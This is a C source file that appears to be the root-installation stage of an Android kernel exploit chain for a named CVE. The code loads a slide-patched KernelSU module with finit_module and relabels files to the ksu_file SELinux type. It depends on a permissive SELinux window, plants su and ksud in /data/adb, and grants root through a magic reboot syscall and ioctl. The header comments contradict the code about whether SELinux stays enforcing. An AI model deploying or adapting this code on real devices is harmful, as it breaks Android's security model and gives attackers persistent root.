/*
 * ksu_boot.c — KernelSU bootstrap for the CVE-2026-99491 K70 endgame.
 *
 * The caller runs in u:r:init:s0 with uid 0 and the full capability set,
 * while SELinux stays Enforcing.  The three research branches solved the
 * load differently (re-exec, in-process, fork+exec) because they first
 * cleared selinux_state->enforcing; on this build selinux_state is out of
 * reach of the record write, so the load relies on the policy extension
 * KernelSU installs instead:
 *
 *   allow domain ksu_file:file { ... execute relabelto ... }
 *   allow domain ksu_file:system module_load
 *
 * The module is written to /data/adb and relabelled ksu_file, then loaded
 * with finit_module; ksud is a ksu_file binary and can be executed from
 * the init domain without a permissive window.  If kernelsu is already
 * live the module step is skipped and only the userspace is installed.
 */
#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <time.h>
#include <unistd.h>

#include "ksu_boot.h"

extern int ko_patch_cli(int argc, char **argv);

#define KSU_WORKDIR      "/data/local/tmp"
#define KSU_SYMS_DEFAULT "/data/local/tmp/ko-syms-5.15.178.txt"
#define KSU_KO_DEFAULT   "/data/local/tmp/ksu-a13.ko"
#define KSU_KO_PATCHED   "/data/local/tmp/ksu-patched.ko"
#define KSU_KSud         "/data/adb/ksud"
#define KSU_MAGIC1       0xdeadbeefU
#define KSU_MAGIC2       0xcafebabeU
#define KSU_IOCTL_GRANT_ROOT 0x4b01UL

static long ksu_now_ms(void)
{
    struct timespec ts;

    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long)ts.tv_sec * 1000L + ts.tv_nsec / 1000000L;
}

/* The shell domain may be denied /proc/sys/kernel/osrelease; uname() does
 * not depend on procfs permissions and returns the same release string. */
static void kernel_release(char *rel, size_t cap)
{
    struct utsname u;

    if (uname(&u) == 0)
        snprintf(rel, cap, "%s", u.release);
    else if (cap)
        rel[0] = 0;
}

static int read_int_file(const char *path)
{
    char b[32];
    int f = open(path, O_RDONLY);
    int n;

    if (f < 0)
        return -1;
    n = (int)read(f, b, sizeof(b) - 1);
    close(f);
    if (n <= 0)
        return -1;
    b[n] = 0;
    return atoi(b);
}

/* Keep the diagnostic log across a panic: stdout points at ksu.out. */
static void ksu_sync(void)
{
    (void)fsync(STDOUT_FILENO);
}

static int write_text_file(const char *path, const char *s)
{
    int f = open(path, O_WRONLY);
    ssize_t n;

    if (f < 0)
        return -1;
    n = write(f, s, strlen(s));
    close(f);
    return n == (ssize_t)strlen(s) ? 0 : -1;
}

static long file_size(const char *path)
{
    struct stat st;

    return stat(path, &st) == 0 ? (long)st.st_size : -1;
}

static int copy_file(const char *src, const char *dst, mode_t mode)
{
    char buf[65536];
    int in = open(src, O_RDONLY);
    int out;
    ssize_t n;

    if (in < 0)
        return -1;
    out = open(dst, O_WRONLY | O_CREAT | O_TRUNC, mode);
    if (out < 0) {
        close(in);
        return -1;
    }
    while ((n = read(in, buf, sizeof buf)) > 0) {
        char *p = buf;

        while (n > 0) {
            ssize_t w = write(out, p, (size_t)n);

            if (w <= 0) {
                close(in);
                close(out);
                return -1;
            }
            p += w;
            n -= w;
        }
    }
    close(in);
    close(out);
    if (n < 0)
        return -1;
    (void)chmod(dst, mode);
    return 0;
}

/* Run av[0] (absolute path) and capture stdout+stderr. */
static int run_capture(char *const av[], char *out, size_t cap,
                       long timeout_ms)
{
    int pfd[2];
    pid_t p;
    size_t used = 0;
    long deadline;
    int st = 0, timed_out = 0;

    if (cap)
        out[0] = 0;
    if (pipe(pfd) < 0)
        return -1;
    p = fork();
    if (p < 0) {
        close(pfd[0]);
        close(pfd[1]);
        return -1;
    }
    if (p == 0) {
        dup2(pfd[1], STDOUT_FILENO);
        dup2(pfd[1], STDERR_FILENO);
        close(pfd[0]);
        close(pfd[1]);
        execv(av[0], av);
        _exit(127);
    }
    close(pfd[1]);
    deadline = ksu_now_ms() + timeout_ms;
    while (cap > 1 && used + 1 < cap) {
        struct pollfd pf;
        long left = deadline - ksu_now_ms();
        ssize_t n;

        if (left <= 0) {
            timed_out = 1;
            break;
        }
        pf.fd = pfd[0];
        pf.events = POLLIN;
        pf.revents = 0;
        if (poll(&pf, 1, (int)(left > 1000 ? 1000 : left)) <= 0)
            continue;
        n = read(pfd[0], out + used, cap - used - 1);
        if (n <= 0)
            break;
        used += (size_t)n;
    }
    close(pfd[0]);
    if (timed_out)
        kill(p, SIGKILL);
    waitpid(p, &st, 0);
    if (cap)
        out[used < cap ? used : cap - 1] = 0;
    if (timed_out)
        return -1;
    return (WIFEXITED(st) && WEXITSTATUS(st) == 0) ? 0 : -1;
}

static int module_live(void)
{
    FILE *f = fopen("/proc/modules", "r");
    char line[256];

    if (!f)
        return 0;
    while (fgets(line, sizeof line, f)) {
        if (!strncmp(line, "kernelsu ", 9)) {
            fclose(f);
            return 1;
        }
    }
    fclose(f);
    return 0;
}

/* Relabel a /data/adb file so the policy's ksu_file rules apply:
 * any domain may relabelto ksu_file, load it and execute it. */
static int set_ksu_label(const char *path)
{
    static const char label[] = "u:object_r:ksu_file:s0";

    if (lsetxattr(path, "security.selinux", label, sizeof label, 0) != 0) {
        printf("[!] ksu: relabel %s failed: %s\n", path, strerror(errno));
        return -1;
    }
    return 0;
}

/* Fallback when pm is unusable from the current cred: locate the manager
 * APK directly under /data/app. */
static int find_manager_apk(char *out, size_t cap)
{
    static const char *const pkgs[] = {
        "me.weishu.kernelsu", "com.derq31.kernelsu",
        "com.king.kernelsu",
    };
    DIR *app = opendir("/data/app");
    struct dirent *e;

    if (!app)
        return -1;
    while ((e = readdir(app))) {
        char base[512];
        DIR *d;
        struct dirent *c;

        if (e->d_name[0] == '.')
            continue;
        snprintf(base, sizeof base, "/data/app/%s", e->d_name);
        d = opendir(base);
        if (!d)
            continue;
        while ((c = readdir(d))) {
            for (size_t i = 0; i < sizeof(pkgs) / sizeof(pkgs[0]); i++) {
                size_t n = strlen(pkgs[i]);
                char apk[600];

                if (strncmp(c->d_name, pkgs[i], n) != 0 ||
                    (c->d_name[n] != '-' && c->d_name[n] != 0))
                    continue;
                snprintf(apk, sizeof apk, "%s/%s/base.apk", base,
                         c->d_name);
                if (access(apk, R_OK) == 0) {
                    snprintf(out, cap, "%s", apk);
                    closedir(d);
                    closedir(app);
                    return 0;
                }
            }
        }
        closedir(d);
    }
    closedir(app);
    return -1;
}

/* Make /data/adb/ksud available and executable (ksu_file label). */
static int ensure_ksud(void)
{
    char apk[512] = "", lib[600];
    char *slash;

    if (file_size(KSU_KSud) > 0) {
        (void)set_ksu_label(KSU_KSud);
        return 0;
    }
    /* HyperBreak 已从选中管理器提取并固化 ksud；直接复用，避免只支持
     * 官方 KernelSU 包名（Nova/FinaSU/MapleSU 等会走到 no manager apk）。 */
    {
        const char *staged = getenv("CVE99491_KSUD");
        if (staged && *staged && file_size(staged) > 0) {
            if (copy_file(staged, KSU_KSud, 0755) != 0) {
                printf("[-] ksu: cannot copy staged ksud %s\n", staged);
                return -1;
            }
            printf("[ksu] staged ksud %s -> %s\n", staged, KSU_KSud);
            return set_ksu_label(KSU_KSud);
        }
    }
    if (find_manager_apk(apk, sizeof apk) != 0) {
        printf("[-] ksu: no manager apk and no %s\n", KSU_KSud);
        return -1;
    }
    snprintf(lib, sizeof lib, "%s", apk);
    slash = strrchr(lib, '/');
    if (!slash)
        return -1;
    *slash = 0;
    strncat(lib, "/lib/arm64-v8a/libksud.so",
            sizeof lib - strlen(lib) - 1);
    if (access(lib, R_OK) != 0) {
        printf("[-] ksu: %s missing\n", lib);
        return -1;
    }
    if (copy_file(lib, KSU_KSud, 0755) != 0) {
        printf("[-] ksu: cannot copy %s\n", lib);
        return -1;
    }
    return set_ksu_label(KSU_KSud);
}

/* Extract the android13-5.15 module from the manager via ksud. */
static int extract_module(char *out, size_t cap)
{
    char rel[128] = "", kmi[32], path[600];

    kernel_release(rel, sizeof rel);
    {
        const char *ap = strstr(rel, "-android");
        const char *dot = strchr(rel, '.');
        int andr, maj, min;

        if (!ap || !dot) {
            printf("[-] ksu: bad release %s\n", rel);
            return -1;
        }
        andr = atoi(ap + 8);
        maj = atoi(rel);
        min = atoi(dot + 1);
        snprintf(kmi, sizeof kmi, "android%d-%d.%d", andr, maj, min);
    }
    if (ensure_ksud() != 0)
        return -1;
    snprintf(path, sizeof path, "%s/kernelsu.ko", KSU_WORKDIR);
    {
        char mod[64], outb[512];
        char *av[6];

        snprintf(mod, sizeof mod, "%s_kernelsu.ko", kmi);
        av[0] = KSU_KSud;
        av[1] = (char *)"debug";
        av[2] = (char *)"extract-binary";
        av[3] = mod;
        av[4] = path;
        av[5] = NULL;
        printf("[ksu] extract %s\n", mod);
        if (run_capture(av, outb, sizeof outb, 30000) != 0 ||
            file_size(path) <= 0) {
            printf("[-] ksu: extract failed: %s\n", outb);
            return -1;
        }
    }
    snprintf(out, cap, "%s", path);
    return 0;
}

/* Patch the module for this boot's slide into /data/local/tmp without
 * loading it.  Used by the AVC endgame: the loader's fsuid is zeroed
 * later, so it can no longer create the temporary file in that
 * directory; it only re-opens the finished file. */
int ksu_preprepare_module(unsigned long long slide, const char *syms_path)
{
    char ko[256], rel[128] = "", sslide[32];
    char *av[7];

    if (!syms_path || !*syms_path)
        syms_path = KSU_SYMS_DEFAULT;
    if (file_size(KSU_KO_DEFAULT) > 0) {
        snprintf(ko, sizeof ko, "%s", KSU_KO_DEFAULT);
    } else if (extract_module(ko, sizeof ko) != 0) {
        return -1;
    }
    kernel_release(rel, sizeof rel);
    snprintf(sslide, sizeof sslide, "%#llx", slide);
    av[0] = (char *)"ko_patch";
    av[1] = ko;
    av[2] = (char *)KSU_KO_PATCHED;
    av[3] = (char *)syms_path;
    av[4] = sslide;
    av[5] = rel;
    av[6] = NULL;
    printf("[ksu] preprepare ko_patch slide=%s release=%s\n", sslide, rel);
    if (ko_patch_cli(6, av) != 0 || file_size(KSU_KO_PATCHED) <= 0) {
        printf("[-] ksu: preprepare patch failed\n");
        return -1;
    }
    return 0;
}

/* finit_module the module the parent patched for this boot. */
static int ksu_load_module(void)
{
    int fd;

    if (file_size(KSU_KO_PATCHED) <= 0) {
        printf("[-] ksu: %s missing\n", KSU_KO_PATCHED);
        return -1;
    }
    /* The parent patched the module while its fsuid still owned
     * /data/local/tmp; this process runs with fsuid 0 and cannot create
     * the temporary file there.  The permissive window is already open,
     * so the ksu_file label is not needed. */
    printf("[ksu] permissive: skipping ksu_file label\n");
    ksu_sync();
    fd = open(KSU_KO_PATCHED, O_RDONLY | O_CLOEXEC);
    if (fd < 0)
        return -1;
    errno = 0;
    {
        long rc = syscall(SYS_finit_module, fd, "allow_shell=1", 0);
        int fe = errno;

        close(fd);
        printf("[ksu] finit_module=%ld errno=%d enforce=%d\n", rc, fe,
               read_int_file("/sys/fs/selinux/enforce"));
        ksu_sync();
        if (rc != 0) {
            write_text_file("/sys/fs/selinux/enforce", "1");
            printf("[ksu] enforcing restored: %d\n",
                   read_int_file("/sys/fs/selinux/enforce"));
            return -1;
        }
        /* Keep the window open: ksud must be copied into /data/adb and
         * installed, and the shell domain cannot reach /data/adb while
         * enforcing.  ksu_boot_inline restores it after userspace. */
        return 0;
    }
    return 0;
}

static int ksu_grant_root(void)
{
    int fd = -1;
    long rc, g;

    errno = 0;
    rc = syscall(SYS_reboot, KSU_MAGIC1, KSU_MAGIC2, 0, &fd);
    printf("[ksu] GRANT_ROOT fd: rc=%ld errno=%d fd=%d\n", rc, errno, fd);
    if (fd < 0)
        return -1;
    errno = 0;
    g = ioctl(fd, KSU_IOCTL_GRANT_ROOT, 0);
    printf("[ksu] GRANT_ROOT ioctl: rc=%ld errno=%d\n", g, errno);
    close(fd);
    return (int)g;
}

/* Install the ksud userspace and enable shell su compatibility. */
static int ksu_install_userspace(void)
{
    static const char *const install[] = { KSU_KSud, "install", NULL };
    char out[1024];
    int fails = 0;

    (void)mkdir("/data/adb/ksu", 0700);
    (void)mkdir("/data/adb/ksu/bin", 0700);
    (void)mkdir("/data/adb/modules", 0700);
    if (ensure_ksud() != 0)
        return -1;
    (void)chmod(KSU_KSud, 0755);
    (void)unlink("/data/adb/ksu/bin/su");
    (void)unlink("/data/adb/ksu/bin/ksud");
    (void)symlink(KSU_KSud, "/data/adb/ksu/bin/su");
    (void)symlink(KSU_KSud, "/data/adb/ksu/bin/ksud");
    printf("[ksu] stage: %s install\n", KSU_KSud);
    if (run_capture((char *const *)install, out, sizeof out, 60000) != 0) {
        printf("[!] ksu: install rc!=0: %s\n", out);
        fails++;
    }
    /* su_compat/shell_su_adb_only are not needed here: allow_shell=1
     * at load plus GRANT_ROOT already give adb shell a uid-0 su.  The
     * exec'd ksud only inherits cap_bset, so the ksuctl would fail with
     * EPERM anyway. */
    if (ksu_grant_root() != 0)
        printf("[!] ksu: GRANT_ROOT failed\n");
    return fails;
}

int ksu_boot_inline(unsigned long long slide, const char *syms_path)
{
    int fails;

    setvbuf(stdout, NULL, _IONBF, 0);
    if (!syms_path || !*syms_path)
        syms_path = KSU_SYMS_DEFAULT;
    printf("[ksu] inline uid=%u euid=%u slide=%#llx syms=%s enforce=%d\n",
           (unsigned)getuid(), (unsigned)geteuid(), slide, syms_path,
           read_int_file("/sys/fs/selinux/enforce"));
    ksu_sync();
    if (!module_live()) {
        if (ksu_load_module() != 0 || !module_live()) {
            printf("[-] ksu: module load failed\n");
            write_text_file("/sys/fs/selinux/enforce", "1");
            printf("[ksu] enforcing restored: %d\n",
                   read_int_file("/sys/fs/selinux/enforce"));
            return -1;
        }
        /* Stays permissive until ksud install finishes; the shell
         * domain needs to create /data/adb/ksud and /data/adb/ksu. */
        printf("[ksu] permissive window kept for ksud install (enforce=%d)\n",
               read_int_file("/sys/fs/selinux/enforce"));
    } else {
        printf("[ksu] kernelsu already live, skipping finit_module\n");
        /* Same reason as the fresh-load path: ksud install needs the
         * permissive window.  ksu_boot_inline restores it afterwards. */
    }
    printf("[ksu] module live\n");
    fails = ksu_install_userspace();
    write_text_file("/sys/fs/selinux/enforce", "1");
    printf("[ksu] userspace failures=%d module=%d enforce=%d\n", fails,
           module_live(), read_int_file("/sys/fs/selinux/enforce"));
    return fails == 0 ? 0 : -1;
}
